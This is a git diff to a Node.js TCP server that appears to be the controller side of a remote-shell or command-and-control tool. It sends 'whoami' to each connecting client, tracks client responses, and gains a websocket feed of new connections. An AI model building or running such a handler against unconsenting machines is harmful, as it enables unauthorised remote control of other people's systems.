@@ -1,5 +1,6 @@
 "use strict";
 const net = require("net");
+const websocket = require("../webserver/ws_server.js");
 const manageServer = require("../manage_server.js");
 const port = 11111;
 const socketClients = require("./clients.js");
@@ -8,7 +9,7 @@ const server = net.createServer((client) => {
         switch (error.code) {
             case "ECONNRESET":
                 console.log("\[-] Client disconnected!");
-                manageServer.getNumberOfClients(server);
+                manageServer.getAndSendNumberOfClients(server);
                 break;
             default:
                 break;
@@ -30,7 +31,7 @@ server.on("connection", (client) => {
     // Response is saved by "data" event since it's the first request.
     client.write("whoami");
 
-    manageServer.getNumberOfClients(server);
+    manageServer.getAndSendNumberOfClients(server);
     manageServer.gotoMainMenu();
 
     client.on("data", async (data) =>  {
@@ -58,6 +59,7 @@ const saveNewClient = (client) => {
     const fullClientAddress = `${client.remoteAddress}:${client.remotePort}`;
     console.log(`[+] Connection receieved: ${fullClientAddress}`);
     socketClients.push({ address : `${fullClientAddress}`, client, messageCount : 0, name: "", responseHistory : [], uptime: 0 });    
+    websocket.uploadNewConnectionData(manageServer.getClientData(client));
 }
 
 const setClientName = (client, name) => {
@@ -65,10 +67,3 @@ const setClientName = (client, name) => {
 }
 
 module.exports = server;
-
-// PROBLEM:
-// ONCE WE SEND ONE COMMAND, WE DONT LOG THE RESPNOSE
-// WE ALSO DONT GET PROMPTED TO SEND ANOTHER MESSAGE
-
-// CHECK OUR CURRENT CLIENT - BUILD IN STATE
-// IF WE GET A MESSAGE AND ITS FROM THE CURRENT CLIENT, PRINT RES
